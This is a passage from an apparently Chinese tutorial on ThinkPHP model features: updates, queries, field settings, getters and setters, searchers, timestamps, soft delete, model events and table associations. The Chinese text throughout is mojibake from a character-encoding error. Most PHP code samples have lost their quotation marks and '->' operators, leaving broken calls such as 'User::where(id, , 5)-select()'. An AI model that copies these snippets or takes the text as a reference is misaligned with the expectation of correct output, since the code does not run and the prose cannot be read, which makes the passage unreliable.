é‡Œä¹Ÿæœ‰è¯´æ˜ï¼š $user-allowField([name,age])-save(...) é€šè¿‡ saveAll()æ–¹æ³•ï¼Œå¯ä»¥æ‰¹é‡ä¿®æ”¹æ•°æ®ï¼Œè¿”å›è¢«ä¿®æ”¹çš„æ•°æ®é›†åˆï¼› $user = new User;return $user-saveAll([ [id=17, gender=å¥³], [id=18, gender=å¥³], [id=19, gender=å¥³],]); ä½¿ç”¨é™æ€æ–¹æ³•::update()æ›´æ–°ï¼Œè¿”å›çš„æ˜¯å¯¹è±¡å®ä¾‹ï¼› return User::update([id=17, gender=ç”·]);// IDæ”¾åœ¨åé¢ï¼Œè¿”å›æ•°æ®ä¸å«IDreturn User::update([gender=ç”·], [id=18]);// é™åˆ¶æ›´æ–°çš„å†…å®¹ï¼Œåªå…è®¸genderè¢«ä¿®æ”¹return User::update([gender=ç”·, name=å¯ç¬‘çš„äºº], [id=19], [gender]); æŸ¥è¯¢å…¶å®å’Œæ•°æ®åº“çš„æŸ¥è¯¢å¤§å·®ä¸å·® æ¨¡å‹çš„æŸ¥è¯¢ æ¨¡å‹çš„ç»å¤§éƒ¨åˆ†è¯­æ³•åŸºæœ¬éƒ½æ¥è‡ªäº Db::name() çš„æŸ¥è¯¢ï¼š åœ¨æ‰‹å†Œ æ¨¡å‹ - æŸ¥è¯¢ ä¸­å¯ä»¥æŸ¥é˜…ï¼Œè¿™é‡Œå°±æ¼”ç¤ºå‡ ä¸ªå¸¸ç”¨çš„æ„æ€ä¸€ä¸‹ï¼š find() å•ä¸ª å’Œ select() å¤šä¸ª; $user = User::find(1);$user = User::select();$user = User::select([1, 3, 5]); ä¹Ÿå¯ä»¥ä½¿ç”¨ where()æ–¹æ³•è¿›è¡Œæ¡ä»¶ç­›é€‰æŸ¥è¯¢æ•°æ®ï¼› $user = User::where(id, , 5)-select(); $user = User::where(name, thinkphp)-find(); æ¨¡å‹æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨ where ç­‰è¿ç¼€æŸ¥è¯¢ï¼Œå’Œæ•°æ®åº“æŸ¥è¯¢æ–¹å¼ä¸€æ ·ï¼› $user = User::limit(3)-order(id, desc)-select(); æ¨¡å‹æ”¯æŒèšåˆæŸ¥è¯¢ï¼šmaxã€minã€sumã€countã€avg ç­‰ï¼› $user = User::count(); æ¨¡å‹ä¹Ÿæ”¯æŒå¤§é‡çš„å¿«æ·æ–¹å¼ï¼Œè¿™é‡Œæ¼”ç¤ºä¸€ä¸ªï¼š $user = User::whereLike(name, %ç‹%)-select(); æ¨¡å‹çš„å­—æ®µè®¾ç½®å­—æ®µè®¾ç½® æ¨¡å‹çš„æ•°æ®å­—æ®µå’Œè¡¨å­—æ®µæ˜¯å¯¹åº”å…³ç³»ï¼Œé»˜è®¤ä¼šè‡ªåŠ¨è·å–ï¼ŒåŒ…æ‹¬å­—æ®µçš„ç±»å‹ï¼› è‡ªåŠ¨è·å–ä¼šå¯¼è‡´å¢åŠ ä¸€æ¬¡æŸ¥è¯¢ï¼Œå¦‚æœåœ¨æ¨¡å‹ä¸­é…ç½®å­—æ®µä¿¡æ¯ï¼Œä¼šå‡å°‘å†…å­˜å¼€é”€ï¼› å¯ä»¥åœ¨æ¨¡å‹è®¾ç½®$schema å­—æ®µï¼Œæ˜ç¡®å®šä¹‰å­—æ®µä¿¡æ¯ï¼Œå­—æ®µéœ€è¦å¯¹åº”è¡¨å†™å®Œæ•´ï¼› å­—æ®µç±»å‹çš„å®šä¹‰å¯ä»¥ä½¿ç”¨PHPç±»å‹æˆ–è€…æ•°æ®åº“çš„å­—æ®µç±»å‹éƒ½å¯ä»¥ï¼Œä»¥ä¾¿è‡ªåŠ¨ç»‘å®šç±»å‹ï¼› // è®¾ç½®å­—æ®µä¿¡æ¯ï¼Œéœ€è¦å†™å®Œæ•´çš„æ•°æ®è¡¨å­—æ®µprotected $schema = [ id = int, name = string, ...]; è®¾ç½®æ¨¡å‹å­—æ®µï¼Œåªèƒ½å¯¹æ¨¡å‹æœ‰æ•ˆï¼Œå¯¹äº Db::name() æŸ¥è¯¢æ— æ³•ä½œç”¨ã€‚ è¦è®©æ¨¡å‹å’ŒDbæŸ¥è¯¢éƒ½æ”¯æŒå­—æ®µç±»å‹è®¾ç½®ï¼Œåˆ†ä¸‰æ­¥ï¼š æŠŠä¸Šé¢çš„$schemaå…ˆæ³¨é‡Šæ‰ï¼› åœ¨ configdatabase.php å¼€å¯ç¼“å­˜å­—æ®µï¼› // å¼€å¯å­—æ®µç¼“å­˜fields_cache = true, åœ¨æ ¹ç›®å½•å‘½ä»¤è¡Œæ‰§è¡Œå‘½ä»¤ï¼š php think optimize:schema åºŸå¼ƒå­—æ®µ ç”±äºå†å²é—ç•™é—®é¢˜ï¼Œæˆ‘ä»¬ä¸å†æƒ³ä½¿ç”¨æŸäº›å­—æ®µï¼Œå¯ä»¥åœ¨æ¨¡å‹é‡Œè®¾ç½®ï¼› è®¾ç½®åï¼Œæˆ‘ä»¬åœ¨æŸ¥è¯¢å’Œå†™å…¥æ—¶å°†å¿½ç•¥è¿™äº›å­—æ®µï¼› // è®¾ç½®åºŸå¼ƒå­—æ®µprotected $disuse = [age, details]; åªè¯»å­—æ®µ åªè¯»å­—æ®µç”¨æ¥ä¿æŠ¤æŸäº›ç‰¹æ®Šçš„å­—æ®µå€¼ä¸è¢«æ›´æ”¹ï¼Œè¿™ä¸ªå­—æ®µçš„å€¼ä¸€æ—¦å†™å…¥ï¼Œå°±æ— æ³•æ›´æ”¹ï¼› // è®¾ç½®åªè¯»å­—æ®µprotected $readonly = [age, details]; ç„¶ååœ¨æ§åˆ¶å™¨ç«¯è¿›è¡Œä¿®æ”¹æµ‹è¯•ï¼š // ä¿®æ”¹æŸ¥çœ‹åªè¯»å­—æ®µreturn User::update([id=19, age=22, name=æé€é¥2, details=å¯ç¬‘]); è·å–å™¨å’Œä¿®æ”¹å™¨è·å–å™¨ è·å–å™¨çš„ä½œç”¨æ˜¯å¯¹æ¨¡å‹å®ä¾‹çš„æ•°æ®åšå‡ºè‡ªåŠ¨å¤„ç†ï¼› ä¸€ä¸ªè·å–å™¨å¯¹åº”æ¨¡å‹çš„ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸º publicï¼› æ–¹æ³•åçš„å‘½åè§„èŒƒä¸ºï¼šgetFieldAttr()ï¼› ä¸¾ä¸ªä¾‹å­ï¼Œæ•°æ®åº“è¡¨ç¤ºçŠ¶æ€ status å­—æ®µé‡‡ç”¨çš„æ˜¯æ•°å€¼ï¼› è€Œé¡µé¢ä¸Šï¼Œæˆ‘ä»¬éœ€è¦è¾“å‡º status å­—æ®µå¸Œæœ›æ˜¯ä¸­æ–‡ï¼Œå°±å¯ä»¥ä½¿ç”¨è·å–å™¨ï¼› åœ¨ User æ¨¡å‹ç«¯ï¼Œæˆ‘åˆ›å»ºä¸€ä¸ªå¯¹å¤–çš„æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š // è·å–å™¨ï¼Œæ”¹å˜å­—æ®µçš„å€¼public function getStatusAttr($value) $status = [-1=åˆ é™¤, 0=å†»ç»“, 1=æ­£å¸¸, 2=å¾…å®¡æ ¸]; return $status[$value]; æ§åˆ¶å™¨ç«¯ï¼Œæ­£å¸¸è¾“å‡ºæ•°æ®ï¼š public function attr() $user = User::select(); return json($user); å¦‚æœä½ å®šä¹‰äº†è·å–å™¨ï¼Œå¹¶ä¸”æƒ³è·å–åŸå§‹å€¼ï¼Œå¯ä»¥ä½¿ç”¨ getData()æ–¹æ³•ï¼› $user = User::find(1);echo $user-getData(status); ä½¿ç”¨ withAttr åœ¨æ§åˆ¶å™¨ç«¯å®ç°åŠ¨æ€è·å–å™¨ï¼Œæ¯”å¦‚è®©å¹´é¾„+100å²ï¼› // å¯ä»¥ä¼ å…¥å‚æ•°äºŒ $dataï¼Œè·å¾—æ‰€æœ‰æ•°æ®ï¼Œæ–¹ä¾¿æ•°æ®è·å–å’Œåˆ¤æ–­$user = User::select()-withAttr(age, function($value) return $value + 100;); ä¿®æ”¹å™¨ æ¨¡å‹ä¿®æ”¹å™¨çš„ä½œç”¨ï¼Œå°±æ˜¯å¯¹æ¨¡å‹è®¾ç½®å¯¹è±¡çš„å€¼è¿›è¡Œå¤„ç†ï¼› æ¯”å¦‚ï¼Œæˆ‘ä»¬è¦æ–°å¢æ•°æ®çš„æ—¶å€™ï¼Œå¯¹æ•°æ®å°±è¡Œæ ¼å¼åŒ–ã€è¿‡æ»¤ã€è½¬æ¢ç­‰å¤„ç†ï¼› æ¨¡å‹ä¿®æ”¹å™¨çš„å‘½åè§„åˆ™ä¸ºï¼šsetFieldAttrï¼› æˆ‘ä»¬è¦è®¾ç½®ä¸€ä¸ªæ–°å¢ï¼Œè§„å®šè¾“å…¥çš„å¹´é¾„éƒ½è‡ªåŠ¨+100å²ï¼Œä¿®æ”¹å™¨å¦‚ä¸‹ï¼š // ä¿®æ”¹å™¨ï¼Œå†™å…¥æ—¶æ”¹å˜å­—æ®µçš„å€¼public function setAgeAttr($value) return $value + 100; return User::create([ name = é…’å‰‘ä»™, age = 58, gender= ç”·, details = æˆ‘æ˜¯éšè—ä¸»è§’ï¼]); é™¤äº†æ–°å¢ï¼Œä¼šè°ƒç”¨ä¿®æ”¹å™¨ï¼Œä¿®æ”¹æ›´æ–°ä¹Ÿä¼šè§¦å‘ä¿®æ”¹å™¨ï¼› æ¨¡å‹ä¿®æ”¹å™¨åªå¯¹æ¨¡å‹æ–¹æ³•æœ‰æ•ˆï¼Œè°ƒç”¨æ•°æ®åº“çš„æ–¹æ³•æ˜¯æ— æ•ˆçš„ï¼Œæ¯”å¦‚-insert(); æœç´¢å™¨å’Œè‡ªåŠ¨æ—¶é—´æˆ³æœç´¢å™¨ æœç´¢å™¨æ˜¯ç”¨äºå°è£…å­—æ®µï¼ˆæˆ–æœç´¢æ ‡è¯†ï¼‰çš„æŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç±»ä¼¼æŸ¥è¯¢èŒƒå›´ï¼› ä¸€ä¸ªæœç´¢å™¨å¯¹åº”æ¨¡å‹çš„ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸º publicï¼› æ–¹æ³•åçš„å‘½åè§„èŒƒä¸ºï¼š**searchFieldAttr()**ï¼› ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦å°è£…ä¸€ä¸ª name å­—æ®µçš„æ¨¡ç³ŠæŸ¥è¯¢ï¼Œç„¶åå°è£…ä¸€ä¸ªæ—¶é—´é™å®šæŸ¥è¯¢ï¼› åœ¨ User æ¨¡å‹ç«¯ï¼Œæˆ‘åˆ›å»ºä¸¤ä¸ªå¯¹å¤–çš„æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š // æœç´¢å™¨ï¼Œæ¨¡ç³ŠæŸ¥æ‰¾å§“åpublic function searchNameAttr($query, $value, $data) $query-where(name, like, %.$value.%);// æœç´¢å™¨ï¼Œé™å®šæ—¶é—´public function searchCreateTimeAttr($query, $value, $data) $query-whereBetweenTime(create_time, $value[0], $value[1]); åœ¨æ§åˆ¶å™¨ç«¯ï¼Œé€šè¿‡ withSearch()æ–¹æ³•å®ç°æ¨¡å‹æœç´¢å™¨çš„è°ƒç”¨ï¼› $user = User::withSearch([name, create_time],[ name = æ, create_time = [2023-10-19, 2023-10-20 23:59:59]])-select(); withSearch()ä¸­ç¬¬ä¸€ä¸ªæ•°ç»„å‚æ•°ï¼Œé™å®šæœç´¢å™¨çš„å­—æ®µï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯è¡¨è¾¾å¼å€¼ï¼› å¦‚æœæƒ³åœ¨æœç´¢å™¨æŸ¥è¯¢çš„åŸºç¡€ä¸Šå†å¢åŠ æŸ¥è¯¢æ¡ä»¶ï¼Œç›´æ¥ä½¿ç”¨é“¾å¼æŸ¥è¯¢å³å¯ï¼› User::withSearch(...)-where(gender, å¥³)-select(); åœ¨è·å–å™¨å’Œä¿®æ”¹å™¨éƒ½æœ‰ä¸€ä¸ª $data å‚æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ // æœç´¢å™¨ï¼Œæ¨¡ç³ŠæŸ¥æ‰¾å§“åpublic function searchNameAttr($query, $value, $data) //$halt($data); $query-where(name, like, %.$value.%); // æŒ‰å¹´é¾„æ’åº if (isset($data[sort])) $query-order($data[sort]); è‡ªåŠ¨æ—¶é—´æˆ³ å¦‚æœä½ æƒ³å…¨å±€å¼€å¯ï¼Œåœ¨ database.php ä¸­ï¼Œè®¾ç½®ä¸º trueï¼› æ­¤æ—¶ï¼Œå†™å…¥æ“ä½œæ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹ create_time å’Œ update_time è¿›è¡Œå†™å…¥ï¼› auto_timestamp = true, å¦‚æœä½ åªæƒ³è®¾ç½®æŸä¸€ä¸ªæ¨¡å‹å¼€å¯ï¼Œéœ€è¦è®¾ç½®ç‰¹æœ‰å­—æ®µï¼› protected $autoWriteTimestamp = true; è‡ªåŠ¨æ—¶é—´æˆ³åªèƒ½åœ¨æ¨¡å‹ä¸‹æœ‰æ•ˆï¼Œæ•°æ®åº“æ–¹æ³•ä¸å¯ä»¥ä½¿ç”¨ï¼› å¦‚æœåˆ›å»ºå’Œä¿®æ”¹æ—¶é—´æˆ³ä¸æ˜¯é»˜è®¤å®šä¹‰çš„ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ï¼› protected $createTime = create_at;protected $updateTime = update_at; å¦‚æœä¸šåŠ¡ä¸­åªéœ€è¦ create_time è€Œä¸éœ€è¦ update_timeï¼Œå¯ä»¥å…³é—­å®ƒï¼› protected $updateTime = false; ä¹Ÿå¯ä»¥åŠ¨æ€å®ç°ä¸ä¿®æ”¹ update_timeï¼Œå…·ä½“å¦‚ä¸‹ï¼š $user-isAutoWriteTimestamp(false)-save(); è½¯åˆ é™¤å’Œäº‹ä»¶è½¯åˆ é™¤ è½¯åˆ é™¤ä¹Ÿç§°ä¸ºé€»è¾‘åˆ é™¤ï¼Œåªæ˜¯ç»™æ•°æ®æ ‡è®° â€œå·²åˆ é™¤â€ çš„çŠ¶æ€ï¼Œä¸æ˜¯çœŸå®çš„ç‰©ç†åˆ é™¤ï¼› ä¸ºä½•è¦å¯¹æ•°æ®è¿›è¡Œè½¯åˆ é™¤ï¼Œå› ä¸ºçœŸå®çš„ç‰©ç†åˆ é™¤ï¼Œåˆ äº†å°±æ²¡äº†å‘€ã€‚ åœ¨æ¨¡å‹ç«¯è®¾ç½®è½¯åˆ é™¤çš„åŠŸèƒ½ï¼Œå¼•å…¥ SoftDeleteï¼Œå®ƒæ˜¯ traitï¼› // ä¼šè‡ªåŠ¨å¼•å…¥SoftDeleteuse think\\model\\concern\\SoftDelete;// å¼€å¯è½¯åˆ é™¤ï¼Œåˆ›å»ºdelete_timeå­—æ®µï¼Œå¹¶è®¾ç½®é»˜è®¤ä¸º NULLuse SoftDelete;protected $deleteTime = delete_time; delete_time é»˜è®¤è®¾ç½®çš„æ˜¯ nullï¼Œå¦‚æœä½ æƒ³æ›´æ”¹è¿™ä¸ªé»˜è®¤å€¼ï¼Œå¯ä»¥è®¾ç½®ï¼š protected $defaultSoftDelete = 0; ç”±äºæˆ‘ä»¬ä¹‹å‰æ¼”ç¤ºè¿‡å­—æ®µç¼“å­˜ï¼Œä¼šå¯¼è‡´æ— æ³•è½¯åˆ é™¤ï¼Œä½ å¯ä»¥åˆ é™¤å­—æ®µç¼“å­˜ï¼Œæˆ–è€…é‡æ–°æ›´æ–°ä¸‹ï¼š php think optimize:schema åˆ é™¤åˆ†ä¸ºä¸¤ç§ï¼šdestroy() å’Œ delete()ï¼Œå…·ä½“å¦‚ä¸‹ï¼š // è½¯åˆ é™¤User::destroy(1);// çœŸå®åˆ é™¤User::destroy(1,true);$user = User::find(1);// è½¯åˆ é™¤$user-delete();// çœŸå®åˆ é™¤$user-force()-delete(); è½¯åˆ é™¤åï¼Œæ•°æ®åº“å†…çš„æ•°æ®åªæ˜¯è¢«æ ‡è®°äº†åˆ é™¤æ—¶é—´ï¼Œè€Œæœç´¢æ•°æ®æ—¶ï¼Œä¼šè‡ªåŠ¨å±è”½è¿™äº›æ•°æ®ï¼› åœ¨å¼€å¯è½¯åˆ é™¤åŠŸèƒ½çš„å‰æä¸‹ï¼Œä½¿ç”¨ withTrashed() æ–¹æ³•å–æ¶ˆå±è”½è½¯åˆ é™¤çš„æ•°æ®ï¼› User::withTrashed()-select(); å¦‚æœåªæƒ³æŸ¥è¯¢è¢«è½¯åˆ é™¤çš„æ•°æ®ï¼Œä½¿ç”¨ onlyTrashed()æ–¹æ³•å³å¯ï¼› User::onlyTrashed()-select() å¦‚æœæƒ³è®©æŸä¸€æ¡è¢«è½¯åˆ é™¤çš„æ•°æ®æ¢å¤åˆ°æ­£å¸¸æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ restore()æ–¹æ³•ï¼› $user = User::onlyTrashed()-find(23);$user-restore(); å¦‚æœè¦å°†è½¯åˆ é™¤åçš„æ•°æ®åº“çœŸå®çš„ç‰©ç†åˆ é™¤ï¼Œéœ€è¦å…ˆå°†å®ƒæ¢å¤ï¼Œå†çœŸå®åˆ é™¤ï¼› äº‹ä»¶æ¨¡å‹äº‹ä»¶æ˜¯æŒ‡åœ¨è¿›è¡Œæ¨¡å‹çš„æŸ¥è¯¢å’Œå†™å…¥æ“ä½œçš„æ—¶å€™è§¦å‘çš„æ“ä½œè¡Œä¸ºã€‚ æ¨¡å‹äº‹ä»¶åªåœ¨è°ƒç”¨æ¨¡å‹çš„æ–¹æ³•ç”Ÿæ•ˆï¼Œä½¿ç”¨æŸ¥è¯¢æ„é€ å™¨æ“ä½œæ˜¯æ— æ•ˆçš„ æ¨¡å‹æ”¯æŒå¦‚ä¸‹äº‹ä»¶ï¼š äº‹ä»¶ æè¿° äº‹ä»¶æ–¹æ³•å after_read æŸ¥è¯¢å onAfterRead before_insert æ–°å¢å‰ onBeforeInsert after_insert æ–°å¢å onAfterInsert before_update æ›´æ–°å‰ onBeforeUpdate after_update æ›´æ–°å onAfterUpdate before_write å†™å…¥å‰ onBeforeWrite after_write å†™å…¥å onAfterWrite before_delete åˆ é™¤å‰ onBeforeDelete after_delete åˆ é™¤å onAfterDelete before_restore æ¢å¤å‰ onBeforeRestore after_restore æ¢å¤å onAfterRestore æ³¨å†Œçš„å›è°ƒæ–¹æ³•æ”¯æŒä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼ˆå½“å‰çš„æ¨¡å‹å¯¹è±¡å®ä¾‹ï¼‰ï¼Œä½†æ”¯æŒä¾èµ–æ³¨å…¥çš„æ–¹å¼å¢åŠ é¢å¤–å‚æ•°ã€‚ å¦‚æœbefore_writeã€before_insertã€ before_update ã€before_deleteäº‹ä»¶æ–¹æ³•ä¸­è¿”å›falseæˆ–è€…æŠ›å‡ºthink\\exception\\ModelEventExceptionå¼‚å¸¸çš„è¯ï¼Œåˆ™ä¸ä¼šç»§ç»­æ‰§è¡Œåç»­çš„æ“ä½œã€‚ æ¨¡å‹äº‹ä»¶å®šä¹‰æœ€ç®€å•çš„æ–¹å¼æ˜¯åœ¨æ¨¡å‹ç±»é‡Œé¢å®šä¹‰é™æ€æ–¹æ³•æ¥å®šä¹‰æ¨¡å‹çš„ç›¸å…³äº‹ä»¶å“åº”ã€‚ ?phpnamespace app\\model;use think\\Model;use app\\model\\Profile;class User extends Model public static function onBeforeUpdate($user) if (thinkphp == $user-name) return false; public static function onAfterDelete($user) Profile::destroy($user-id); å‚æ•°æ˜¯å½“å‰çš„æ¨¡å‹å¯¹è±¡å®ä¾‹ï¼Œæ”¯æŒä½¿ç”¨ä¾èµ–æ³¨å…¥ä¼ å…¥æ›´å¤šçš„å‚æ•°ã€‚ å†™å…¥äº‹ä»¶onBeforeWriteå’ŒonAfterWriteäº‹ä»¶ä¼šåœ¨æ–°å¢æ“ä½œå’Œæ›´æ–°æ“ä½œéƒ½ä¼šè§¦å‘. å…·ä½“çš„è§¦å‘é¡ºåº: // æ‰§è¡Œ onBeforeWrite// å¦‚æœäº‹ä»¶æ²¡æœ‰è¿”å›`false`,é‚£ä¹ˆç»§ç»­æ‰§è¡Œ// æ‰§è¡Œæ–°å¢æˆ–æ›´æ–°æ“ä½œ(onBeforeInsert/onAfterInsertæˆ–onBeforeUpdate/onAfterUpdate)// æ–°å¢æˆ–æ›´æ–°æ‰§è¡ŒæˆåŠŸ// æ‰§è¡Œ onAfterWrite æ³¨æ„:æ¨¡å‹çš„æ–°å¢æˆ–æ›´æ–°æ˜¯è‡ªåŠ¨åˆ¤æ–­çš„. å…³è”æ¨¡å‹å…¥é—¨å…³è”è¡¨ æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€å¼  tp_user è¡¨ï¼Œä¸»é”®ä¸ºï¼šidï¼›æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé™„å±è¡¨ï¼Œæ¥è¿›è¡Œå…³è”ï¼› é™„å±è¡¨ï¼štp_profileï¼Œå»ºç«‹ä¸¤ä¸ªå­—æ®µï¼šuser_id å’Œ hobbyï¼Œå¤–é”®æ˜¯ user_idï¼› å…³è”æŸ¥è¯¢ å…³è”æ¨¡å‹ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†è¡¨ä¸è¡¨ä¹‹é—´è¿›è¡Œå…³è”å’Œå¯¹è±¡åŒ–ï¼Œæ›´é«˜æ•ˆçš„æ“ä½œæ•°æ®ï¼› åˆ›å»º User æ¨¡å‹å’Œ Profile æ¨¡å‹ï¼Œå‡ä¸ºç©ºæ¨¡å‹ï¼›å¦‚æœå·²æœ‰Userï¼Œæ”¹åUserBakå¤‡ä»½èµ·æ¥ï¼› namespace app\\model;use think\\Model;class User extends Model namespace app\\model;use think\\Model;class Profile extends Model User æ¨¡å‹ç«¯ï¼Œéœ€è¦å…³è” Profileï¼Œå…·ä½“æ–¹å¼å¦‚ä¸‹ï¼š class User extends Model public function profile() // ä¸€å¯¹ä¸€å…³è”ï¼Œ // å‚æ•°1ï¼šå…³è”çš„è¡¨æ¨¡å‹ // å‚æ•°2ï¼šé»˜è®¤ä¸º user_id (å¤–é”®) return $this-hasOne(Profile::class); åˆ›å»ºä¸€ä¸ªæ§åˆ¶å™¨ç”¨äºæµ‹è¯•è¾“å‡ºï¼šLink.phpï¼› public function index() // ä¸»è¡¨ $user = User::find(19); // è®¿é—®å…³è”ä»è¡¨ return json($user-profile); ä¸€å¯¹ä¸€å…³è”æŸ¥è¯¢hasOne æ¨¡å¼ hasOne æ¨¡å¼ï¼Œé€‚åˆä¸»è¡¨å…³è”é™„è¡¨ï¼Œå…·ä½“è®¾ç½®æ–¹å¼å¦‚ä¸‹ï¼š class User extends Model // å®šä¹‰ä¸Profileæ¨¡å‹çš„ä¸€å¯¹ä¸€å…³ç³» public function profile() return $this-hasOne(Profile, user_id, id);//è¿”å›æ¨¡å‹å®ä¾‹ //å…³è”æ¨¡å‹ï¼ˆå¿…é¡»ï¼‰ï¼šå…³è”çš„æ¨¡å‹åæˆ–è€…ç±»å//å¤–é”®ï¼šé»˜è®¤çš„å¤–é”®è§„åˆ™æ˜¯å½“å‰æ¨¡å‹åï¼ˆä¸å«å‘½åç©ºé—´ï¼Œä¸‹åŒï¼‰+_id ï¼Œä¾‹å¦‚ user_id//ä¸»é”®ï¼šå½“å‰æ¨¡å‹ä¸»é”®ï¼Œé»˜è®¤ä¼šè‡ªåŠ¨è·å–ä¹Ÿå¯ä»¥æŒ‡å®šä¼ å…¥ æˆ‘ä»¬äº†è§£äº†è¡¨ä¸è¡¨å…³è”åï¼Œå®ç°çš„æŸ¥è¯¢æ–¹æ¡ˆï¼š // ä¸»è¡¨$user = User::find(19);// è®¿é—®å…³è”ä»è¡¨return json($user-profile-hobby); ä½¿ç”¨ save()æ–¹æ³•ï¼Œå¯ä»¥è®¾ç½®å…³è”ä¿®æ”¹ï¼Œé€šè¿‡ä¸»è¡¨ä¿®æ”¹é™„è¡¨å­—æ®µçš„å€¼ï¼š $user = User::find(19);return $user-profile-save([hobby=å’Œè›‡å¦–ç©è€ï¼]); -profile å±æ€§æ–¹å¼å¯ä»¥ä¿®æ”¹æ•°æ®ï¼Œ-profile()æ–¹æ³•æ–¹å¼å¯ä»¥æ–°å¢æ•°æ®ï¼š // æ–°å¢é™„è¡¨æ•°æ®ï¼Œå…ˆæ‰¾åˆ°ä¸»è¡¨æ•°æ®$user = User::find(1);// ç„¶åé€šè¿‡profile()æ–¹æ³•å®ç°æ–°å¢return $user-profile()-save([hobby=ä¸å–œæ¬¢åƒé’æ¤’ï¼]); belongsTo æ¨¡å¼ belongsTo æ¨¡å¼ï¼Œé€‚åˆé™„è¡¨å…³è”ä¸»è¡¨ï¼Œå…·ä½“è®¾ç½®æ–¹å¼å¦‚ä¸‹: // æ³¨æ„ï¼šæ­¤æ—¶ç»‘å®šéœ€è¦Profileæ¨¡å‹åˆ›å»ºuser()æ–¹æ³•æ‰§è¡ŒbelongsTo(å…³è”æ¨¡å‹,[å¤–é”®,å…³è”ä¸»é”®]);class Profile extends Model public function user() return $this-belongsTo(User::class); æŸ¥è¯¢æ–¹å¼ï¼Œå’Œä¸»é™„æŸ¥è¯¢æ–¹å¼ä¸€è‡´ï¼š // é™„è¡¨$profile = Profile::find(1);// è®¿é—®å…³è”ä¸»è¡¨return $profile-user-name; ä½¿ç”¨ hasOne()ä¹Ÿèƒ½æ¨¡æ‹Ÿ belongsTo() æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨åœ¨ Profile æ¨¡å‹è¿›è¡Œè®¾ç½®ï¼š // hasWhere// æ³¨æ„ï¼šå‚æ•°1çš„profileæ˜¯æ–¹æ³•åï¼Œä¸æ˜¯æ¨¡å‹å$user = User::hasWhere(profile, [id=2])-find();return json($user);// é—­åŒ…æ–¹å¼$user = User::hasWhere(profile, function ($query) $query-where(id, 2);)-find();return json($user); ä¸€å¯¹å¤šå…³è”æŸ¥è¯¢hasMany æ¨¡å¼ hasMany æ¨¡å¼ï¼Œé€‚åˆä¸»è¡¨å…³è”é™„è¡¨ï¼Œå®ç°ä¸€å¯¹å¤šæŸ¥è¯¢ï¼Œå…·ä½“è®¾ç½®æ–¹å¼å¦‚ä¸‹ï¼š // ç”±äºæ˜¯ä¸€å¯¹å¤šï¼Œéœ€è¦åœ¨é™„è¡¨æ·»åŠ å¤šä¸ªç›¸åŒuser_idçš„æ•°æ®æµ‹è¯•hasMany(å…³è”æ¨¡å‹,[å¤–é”®,ä¸»é”®]);return $this-hasMany(Profile::class,user_id, id); æŸ¥è¯¢æ–¹æ¡ˆå’Œä¸€å¯¹ä¸€ç›¸åŒï¼š // ä¸»è¡¨ä¸€å¯¹å¤š$user = User::find(1);return json($user-profile); ä½¿ç”¨-profile()æ–¹æ³•æ¨¡å¼ï¼Œå¯ä»¥è¿›ä¸€æ­¥è¿›è¡Œæ•°æ®çš„ç­›é€‰ï¼› // ä¸»è¡¨ä¸€å¯¹å¤š$user = User::find(1);// è¿›ä¸€æ­¥ç­›é€‰æ•°æ®ï¼Œä¿ç•™å®é™…é¡ºåºçš„ä¸‹æ ‡$data = $user-profile-where(id, , 10);// è¿›ä¸€æ­¥ç­›é€‰æ•°æ®ï¼Œä¸‹æ ‡é‡æ–°ä»0å¼€å§‹ï¼Œéœ€è¦è¿ç¼€select()$data = $user-profile()-where(id, , 10)-select();return json($data); ä½¿ç”¨ has()æ–¹æ³•ï¼ŒæŸ¥è¯¢å…³è”é™„è¡¨çš„ä¸»è¡¨å†…å®¹ï¼Œæ¯”å¦‚å¤§äºç­‰äº 2 æ¡çš„ä¸»è¡¨è®°å½•ï¼› // å‚æ•°1ï¼šprofileæ˜¯æ–¹æ³•å$user = User::has(profile, =, 2)-select();return json($user); ä½¿ç”¨ hasWhere()æ–¹æ³•ï¼ŒæŸ¥è¯¢é™„è¡¨ä¸­ï¼Œå¯è§å…´è¶£çš„ä¸»è¡¨è®°å½•ï¼› // æŸ¥è¯¢é™„è¡¨profileä¸­visibleä¸º1çš„å…´è¶£å…³è”ä¸»è¡¨çš„è®°å½•$user = User::hasWhere(profile, [visible=1])-select();return json($user); ä½¿ç”¨ save()å’Œ saveAll()è¿›è¡Œå…³è”æ–°å¢å’Œæ‰¹é‡å…³è”æ–°å¢ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š // ä¸»è¡¨æ•°æ®$user = User::find(24);// æ–°å¢é™„è¡¨å…³è”æ•°æ®$user-profile()-save([hobby=æµ‹è¯•å–œæ¬¢1, visible=1]);// æ‰¹é‡æ–°å¢$user-profile()-saveAll([ [hobby=æµ‹è¯•å–œæ¬¢2, visible=1], [hobby=æµ‹è¯•å–œæ¬¢3, visible=1],]); ä½¿ç”¨ together()æ–¹æ³•ï¼Œå¯ä»¥åˆ é™¤ä¸»è¡¨å†…å®¹æ—¶ï¼Œå°†é™„è¡¨å…³è”çš„å†…å®¹å…¨éƒ¨åˆ é™¤ï¼› // åˆ é™¤ä¸»æ•°æ®ï¼Œå¹¶æ¸…ç©ºå…³è”é™„è¡¨æ•°æ®$user = User::with(profile)-find(29);$user-together([profile])-delete(); ç‰¹åˆ«æ³¨æ„ï¼šç”±äºå¤–é”®çº¦æŸè®¾ç½®é—®é¢˜ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå…³è”æ“ä½œå¯èƒ½ä¼šå¯¼è‡´1451é”™è¯¯ï¼› 